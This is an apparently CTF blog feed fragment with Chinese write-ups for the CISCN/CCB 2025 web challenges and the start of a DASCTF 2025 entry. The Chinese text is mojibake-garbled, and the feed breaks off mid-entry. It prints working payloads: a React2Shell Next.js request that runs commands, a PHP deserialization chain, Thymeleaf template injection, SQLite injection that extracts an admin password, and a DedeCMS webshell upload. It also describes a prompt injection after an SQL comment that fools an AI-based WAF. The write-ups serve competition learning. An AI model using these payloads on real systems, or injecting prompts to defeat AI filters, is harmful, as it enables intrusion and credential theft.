    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç¬¬åä¹å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›ï¼ˆåˆ›æ–°èƒ½åŠ›å®è·µèµ›ï¼‰æš¨ç¬¬ä¸‰å±Šâ€œé•¿åŸæ¯â€ç½‘æ•°æ™ºå®‰å…¨å¤§èµ›ï¼ˆé˜²æŠ¤èµ›ï¼‰åˆèµ›</p><p>ç¥ç§˜ 11 é“ web é¢˜</p><span id="more"></span><hr><h1 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h1><p>å‰å°æ³¨å†Œä¸€ä¸ªå‰å°è´¦æˆ·å‘ç°æœ‰ä¸€ä¸ª Aa123456789 çš„è´¦æˆ·ï¼Œå°è¯•ç™»å½•å‘ç°æ˜¯ç®¡ç†å‘˜è´¦æˆ·</p><p>Aa123456789:Aa123456789 ç™»å½•åå°</p><p><img src="/blog/2025/12/28/CISCN-CCB2025/IMG-20251230015735247.png"></p><p>è¿›å…¥åå°ï¼Œæ ¸å¿ƒ-æ™®é€šæ–‡ç« -æ·»åŠ æ–‡æ¡£-ç¼©ç•¥å›¾å¤„å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œç›´æ¥ä¼ ä¸ªå›¾ç‰‡é©¬æ”¹ php åç¼€ä¸Šå»</p><p><img src="/blog/2025/12/28/CISCN-CCB2025/IMG-20251228114509974.png"></p><p>ç„¶åå°± getshell äº†</p><hr><h1 id="Redjs"><a href="#Redjs" class="headerlink" title="Redjs"></a>Redjs</h1><p>react2shell ç§’äº†</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/apps</span> <span class="token http-version property">HTTP/2.0</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">eci-2zee0kaqistouenwy4dr.cloudeci1.ichunqiu.com:3000</span></span><span class="token header"><span class="token header-name keyword">Next-Action</span><span class="token punctuation">:</span> <span class="token header-value">x</span></span><span class="token header"><span class="token header-name keyword">X-Nextjs-Request-Id</span><span class="token punctuation">:</span> <span class="token header-value">b5dce965</span></span><span class="token header"><span class="token header-name keyword">user-agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0</span></span><span class="token header"><span class="token header-name keyword">sec-fetch-mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span><span class="token header"><span class="token header-name keyword">cookie</span><span class="token punctuation">:</span> <span class="token header-value">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1757815655</span></span><span class="token header"><span class="token header-name keyword">accept-encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br, zstd</span></span><span class="token header"><span class="token header-name keyword">sec-fetch-dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span><span class="token header"><span class="token header-name keyword">accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">te</span><span class="token punctuation">:</span> <span class="token header-value">trailers</span></span><span class="token header"><span class="token header-name keyword">sec-fetch-site</span><span class="token punctuation">:</span> <span class="token header-value">none</span></span><span class="token header"><span class="token header-name keyword">sec-fetch-user</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span><span class="token header"><span class="token header-name keyword">priority</span><span class="token punctuation">:</span> <span class="token header-value">u=0, i</span></span><span class="token header"><span class="token header-name keyword">accept-language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad</span></span><span class="token header"><span class="token header-name keyword">X-Nextjs-Html-Request-Id</span><span class="token punctuation">:</span> <span class="token header-value">SSTMXm7OJ_g0Ncx6jpQt9</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">740</span></span>------WebKitFormBoundaryx8jO2oVc6SWP3Sad<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="0"</span></span>&#123;  "then": "$1:__proto__:then",  "status": "resolved_model",  "reason": -1,  "value": "&#123;\"then\":\"$B1337\"&#125;",  "_response": &#123;    "_prefix": "var res=process.mainModule.require('child_process').execSync('cat /flag',&#123;'timeout':5000&#125;).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), &#123;digest:`$&#123;res&#125;`&#125;);",    "_chunks": "$Q2",    "_formData": &#123;      "get": "$1:constructor:constructor"    &#125;  &#125;&#125;------WebKitFormBoundaryx8jO2oVc6SWP3Sad<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="1"</span></span>"$@0"------WebKitFormBoundaryx8jO2oVc6SWP3Sad<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="2"</span></span>[]------WebKitFormBoundaryx8jO2oVc6SWP3Sad--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="hellogate"><a href="#hellogate" class="headerlink" title="hellogate"></a>hellogate</h1><p>è¿›å»ä¸€å¼ å›¾ï¼ŒæŠ“åŒ…ä¸€çœ‹æºç è—åœ¨å“åº”ä½“åº•ä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">triggerMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$worker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">worker</span><span class="token operator">-></span><span class="token property">result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$raw</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"muzujijiji.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token function">triggerMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>expï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$worker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">worker</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Deprecated"><a href="#Deprecated" class="headerlink" title="Deprecated"></a>Deprecated</h1><p>é«˜èƒ½å›çŒ®ç»™ä¸Šä¸€å±Š ccb å†³èµ›çš„æƒ…ä¹¦å¯¹å—</p><p>é‚£è¿˜è¯´å•¥äº†ï¼Œç›´æ¥æŠ„ a1natas çš„å…¬ä¼—å·å°±æ˜¯äº†</p><p>ç»å…¸ rs256 ä¸ hs256 çš„åå·®</p><p><img src="/blog/2025/12/28/CISCN-CCB2025/IMG-20251230012953532.png"></p><hr><h1 id="EzJava"><a href="#EzJava" class="headerlink" title="EzJava"></a>EzJava</h1><p>é¢˜ç›®æè¿°è¯´åˆ é™¤äº†æ‰€æœ‰çš„ç³»ç»Ÿå‘½ä»¤ï¼Œéœ€è¦è¯»å–æ•æ„Ÿæ–‡ä»¶</p><p>å¼±å£ä»¤ admin:admin123 ç›´æ¥ç™»è¿›å»ï¼Œæœ‰ä¸€ä¸ªæ¨¡æ¿æ¸²æŸ“é¢„è§ˆçš„åŠŸèƒ½ï¼Œä¸€çœ¼ thymeleaf</p><p>æµ‹è¯•äº†ä¸‹å‘ç°æœ‰å¦‚ä¸‹æ£€æµ‹æ›¿æ¢ï¼š</p><p><code>T(</code> æ¢æˆ NoNo<br><code>new</code> æ¢æˆ Wow<br><code>flag</code> æ¢æˆ Xxxx</p><p>ç›´æ¥ç”¨ç©ºæ ¼ç»•è¿‡ç¬¬ä¸€ä¸ªæ£€æµ‹ï¼Œå…ˆå°è¯•åˆ—å‡ºç›®å½•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>p th<span class="token operator">:</span>text<span class="token operator">=</span><span class="token string">"$&#123;T (java.util.Arrays).toString(T (java.io.File).listRoots()[0].list())&#125;"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯çŸ¥ flag åœ¨ &#x2F;flag_y0u_d0nt_kn0w</p><p>ç„¶åé€šè¿‡ç´¢å¼•è¯»å–å†…å®¹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>p th<span class="token operator">:</span>text<span class="token operator">=</span><span class="token string">"$&#123;T (java.io.File).readAllLines(T (java.nio.files.Paths).get('/'.concat(T (java.io.File).listRoots()[0].list()[19]))).get(0)&#125;"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="AI-WAF"><a href="#AI-WAF" class="headerlink" title="AI_WAF"></a>AI_WAF</h1><p>&#x2F;search ä¸€ä¸ª sql æ³¨å…¥ï¼Œè¯´æ˜¯ç”¨ AI è¿›è¡Œ WAF çš„ï¼Œæµ‹äº†ä¸‹åº”è¯¥æ˜¯æ ¹æ® confidence è¶…è¿‡æŸä¸ªå€¼æ¥åˆ¤æ–­æ˜¯å¦æ‹¦æˆªçš„</p><p>fuzz ä¸€ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ä¸å¯ç”¨<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'SELECT'</span><span class="token punctuation">,</span> <span class="token string">'union'</span><span class="token punctuation">,</span> <span class="token string">'UNION'</span><span class="token punctuation">,</span> <span class="token string">'union select'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">,</span> <span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'where'</span><span class="token punctuation">,</span> <span class="token string">'WHERE'</span><span class="token punctuation">,</span> <span class="token string">'order'</span><span class="token punctuation">,</span> <span class="token string">'ORDER'</span><span class="token punctuation">,</span> <span class="token string">'group'</span><span class="token punctuation">,</span> <span class="token string">'as'</span><span class="token punctuation">,</span> <span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token string">'char'</span><span class="token punctuation">,</span> <span class="token string">'benchmark'</span><span class="token punctuation">,</span> <span class="token string">'concat'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ban å¾—ä¸€å¹²äºŒå‡€ï¼Œæ—¢ç„¶é¢˜ç›®å¼ºè°ƒæ˜¯ AIï¼Œé‚£å°±å°è¯•æç¤ºè¯æ³¨å…¥ï¼Œåœ¨ <code>-- </code> æ³¨é‡Šç¬¦åé¢åŠ ä¸Šè‡ªå·±çš„æç¤ºè¯</p><p><img src="/blog/2025/12/28/CISCN-CCB2025/IMG-20251229223818245.png"></p><hr><h1 id="0o0o0o0o0ï¼ˆUnsolvedï¼‰"><a href="#0o0o0o0o0ï¼ˆUnsolvedï¼‰" class="headerlink" title="0o0o0o0o0ï¼ˆUnsolvedï¼‰"></a>0o0o0o0o0ï¼ˆUnsolvedï¼‰</h1><p>åˆ«ç¬‘ï¼Œæˆ‘æ¥äº†æ²¡è¿‡ç¬¬äºŒå…³</p><p>éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·ä¸Šå»ï¼Œè®¿é—® data æ¥å£ï¼Œæµ‹è¯•å‘ç° id å­˜åœ¨ sql æ³¨å…¥</p><p>fuzz ä¸€ä¸‹ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ä¸å¯ç”¨: <span class="token punctuation">[</span><span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'||'</span><span class="token punctuation">,</span> <span class="token string">'order'</span><span class="token punctuation">,</span> <span class="token string">'ORDER'</span><span class="token punctuation">,</span> <span class="token string">'as'</span><span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">,</span> <span class="token string">'mid'</span><span class="token punctuation">,</span> <span class="token string">'left'</span><span class="token punctuation">,</span> <span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'information_schema'</span><span class="token punctuation">,</span> <span class="token string">'database'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'sqlite_master'</span><span class="token punctuation">,</span> <span class="token string">'word'</span><span class="token punctuation">,</span> <span class="token string">'%23'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨é‡Šç¬¦ä¸èƒ½ç”¨ <code>--</code> å’Œ <code>#</code> ï¼Œè€ƒè™‘æ‰‹åŠ¨é—­åˆï¼Œåé¢å‘ç°æ˜¯ sqlite å¯ä»¥æ”¯æŒ <code>/*</code> æ³¨é‡Š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1, '</span>test<span class="token string">', 3 where '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥è”åˆæŸ¥è¯¢è¿”å›ä¸‰ä¸ªå›æ˜¾ä½ï¼Œç”±äº database è¢« ban äº†æ²¡æ³•å¾—çŸ¥æ•°æ®åº“åï¼ŒçŒœå‡º users è¡¨</p><p>å› ä¸ºæ˜¯ sqlite æ‰€ä»¥å¯ä»¥æŸ¥ä¸€ä¸‹æœ‰å“ªäº›åˆ—ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1, group_concat(name), 3 from pragma_table_info('</span>users<span class="token string">') where '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token operator">|</span>ID<span class="token operator">|</span>Name <span class="token punctuation">(</span>UUID<span class="token punctuation">)</span><span class="token operator">|</span>Content <span class="token punctuation">(</span>UUID<span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">|</span><span class="token comment">---|---|---|</span><span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">3</span><span class="token operator">|</span>id<span class="token punctuation">,</span>create_time<span class="token punctuation">,</span>email<span class="token punctuation">,</span>password<span class="token punctuation">,</span>role<span class="token punctuation">,</span>username<span class="token operator">|</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°è¯•æŸ¥è¯¢ ADMIN çš„ users</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1, role, username from users where role='</span>ADMINIDName <span class="token punctuation">(</span>UUID<span class="token punctuation">)</span>Content <span class="token punctuation">(</span>UUID<span class="token punctuation">)</span><span class="token number">1</span>user457f285eADMIN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯ç”±äº password è¢« ban äº†ï¼Œè€ƒè™‘åˆ©ç”¨åˆ«åè¿›è¡Œæ— åˆ—åæ³¨å…¥ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1, x.d, 3 from (select 1 a, 2 b, 3 c, 4 d, 5 e, 6 f union select * from users where role = '</span>ADMIN'<span class="token punctuation">)</span> x <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">1</span><span class="token operator">/</span><span class="token operator">*</span><span class="token operator">|</span>ID<span class="token operator">|</span>Name <span class="token punctuation">(</span>UUID<span class="token punctuation">)</span><span class="token operator">|</span>Content <span class="token punctuation">(</span>UUID<span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">|</span><span class="token comment">---|---|---|</span><span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">3</span><span class="token operator">|</span>eb3118d7<span class="token operator">-</span><span class="token number">29</span>ba<span class="token operator">-</span><span class="token number">46</span>dc<span class="token operator">-</span><span class="token number">9</span>af3<span class="token operator">-</span><span class="token number">10</span>fdc41510f9<span class="token operator">|</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ° admin çš„å¯†ç ï¼Œå¯ä»¥ç™»å½•åˆ° admin</p><p>è¿›å» admin panel å‘ç°é‡Œé¢æ˜¯ä¸€ä¸ªä¸Šä¼  excel å¹¶è§£æçš„åŠŸèƒ½ï¼Œä¸ä¼šåšæ¥ä¸åŠäº† ğŸ˜­</p><p><img src="/blog/2025/12/28/CISCN-CCB2025/IMG-20251229222755343.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ç¬¬åä¹å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›ï¼ˆåˆ›æ–°èƒ½åŠ›å®è·µèµ›ï¼‰æš¨ç¬¬ä¸‰å±Šâ€œé•¿åŸæ¯â€ç½‘æ•°æ™ºå®‰å…¨å¤§èµ›ï¼ˆé˜²æŠ¤èµ›ï¼‰åˆèµ›&lt;/p&gt;
&lt;p&gt;ç¥ç§˜ 11 é“ web é¢˜&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="jwt" scheme="http://c1oudfl0w0.github.io/blog/tags/jwt/"/>
    
    <category term="CMS" scheme="http://c1oudfl0w0.github.io/blog/tags/CMS/"/>
    
    <category term="Next" scheme="http://c1oudfl0w0.github.io/blog/tags/Next/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2025ä¸‹åŠå¹´èµ›</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/12/06/DASCTF-2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/12/06/DASCTF-2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B/</id>
    <published>2025-12-06T02:42:33.000Z</published>
    <updated>2026-02-05T06:30:28.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ—  pwn æ‰‹ä½œæˆ˜ï¼Œé—æ†¾ç¬¬ä¹</p><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s/CCsdqEK_HOlE4eXj7QDEnQ">https://mp.weixin.qq.com/s/CCsdqEK_HOlE4eXj7QDEnQ</a></p><p><a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/pyuic5kgzp3xe3tg">https://www.yuque.com/chuangfeimeiyigeren/eeii37/pyuic5kgzp3xe3tg</a></p><span id="more"></span><hr><h1 id="AIç”»å¸ˆçš„å°ç§˜å¯†"><a href="#AIç”»å¸ˆçš„å°ç§˜å¯†" class="headerlink" title="AIç”»å¸ˆçš„å°ç§˜å¯†"></a>AIç”»å¸ˆçš„å°ç§˜å¯†</h1><p><img src="/blog/2025/12/06/DASCTF-2025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9B/20251206104312.png"></p><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="DigitalSignature"><a href="#DigitalSignature" class="headerlink" title="DigitalSignature"></a>DigitalSignature</h2><p>ai æ¢­å‡ºæ¥çš„</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> web3 <span class="token keyword">import</span> Web3<span class="token keyword">from</span> eth_account<span class="token punctuation">.</span>messages <span class="token keyword">import</span> encode_defunct<span class="token keyword">from</span> eth_keys <span class="token keyword">import</span> keys<span class="token comment"># ç»™å®šçš„æ•°æ®</span>message <span class="token operator">=</span> <span class="token string">"Find out the signer. Flag is account address that wrapped by DASCTF&#123;&#125;."</span>message_hash <span class="token operator">=</span> <span class="token string">"0x61a78e3c572c1615a6ddd0a0e20157d22b72b8c217cb247318f2c791f4ab6b85"</span>signature <span class="token operator">=</span> <span class="token string">"0x019c4c2968032373cb8e19f13450e93a1abf8658097405cda5489ea22d3779b57815a7e27498057a8c29bcd38f9678b917a887665c1f0d970761cacdd8c41fb61b"</span><span class="token comment"># ä½¿ç”¨web3æ¥æ¢å¤ç­¾åè€…</span>w3 <span class="token operator">=</span> Web3<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ä»ç­¾åæ¢å¤å…¬é’¥å’Œåœ°å€</span>message_obj <span class="token operator">=</span> encode_defunct<span class="token punctuation">(</span>text<span class="token operator">=</span>message<span class="token punctuation">)</span>recovered_address <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>recover_message<span class="token punctuation">(</span>message_obj<span class="token punctuation">,</span> signature<span class="token operator">=</span>signature<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"æ¢å¤çš„åœ°å€: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>recovered_address<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># è½¬æ¢ä¸ºchecksumåœ°å€</span>checksum_address <span class="token operator">=</span> w3<span class="token punctuation">.</span>to_checksum_address<span class="token punctuation">(</span>recovered_address<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Checksumåœ°å€: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>checksum_address<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># ç”Ÿæˆflag</span>flag <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"DASCTF&#123;&#123;</span><span class="token interpolation"><span class="token punctuation">&#123;</span>checksum_address<span class="token punctuation">&#125;</span></span><span class="token string">&#125;&#125;"</span></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="SecretPhotoGallery"><a href="#SecretPhotoGallery" class="headerlink" title="SecretPhotoGallery"></a>SecretPhotoGallery</h2><p>ç™»å½•å¤„ password å­˜åœ¨ sqlite æ³¨å…¥ï¼š<code>1&#39;</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">SQLite3::query<span class="token punctuation">(</span><span class="token punctuation">)</span>: Unable <span class="token keyword">to</span> <span class="token keyword">prepare</span> statement: <span class="token number">1</span><span class="token punctuation">,</span> unrecognized token: <span class="token string">"'1''"</span>SQLite3::query<span class="token punctuation">(</span><span class="token punctuation">)</span>: Unable <span class="token keyword">to</span> <span class="token keyword">prepare</span> statement: <span class="token number">1</span><span class="token punctuation">,</span> SELECTs <span class="token keyword">to</span> the <span class="token keyword">left</span> <span class="token operator">and</span> <span class="token keyword">right</span> <span class="token keyword">of</span> <span class="token keyword">UNION</span> <span class="token keyword">do</span> <span class="token operator">not</span> have the same number <span class="token keyword">of</span> result <span class="token keyword">columns</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ° hs256 jwtï¼š</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&#123;    "user": "admin",    "role": "guest",    "iat": 1764988542&#125;<span aria-hidden="true" 